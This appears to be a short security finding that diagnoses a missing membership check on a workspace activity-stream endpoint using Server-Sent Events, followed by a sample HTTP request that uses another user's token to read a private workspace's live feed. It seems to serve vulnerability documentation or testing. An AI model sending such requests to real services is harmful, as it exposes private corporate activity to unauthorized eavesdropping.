diagnosis: The endpoint streams real-time workspace activity over an EventSourceResponse Server-Sent Events channel based solely on the workspace_id path parameter. It does not check whether current_user is a member of workspace_id, allowing any authenticated user to eavesdrop on live notifications and member actions in private corporate workspaces.
exploit_request:
GET /api/v1/workspaces/ws_enterprise_boardroom/activity-stream HTTP/1.1
Host: api.example.com
Authorization: Bearer <unauthorized_user_jwt>
Accept: text/event-stream
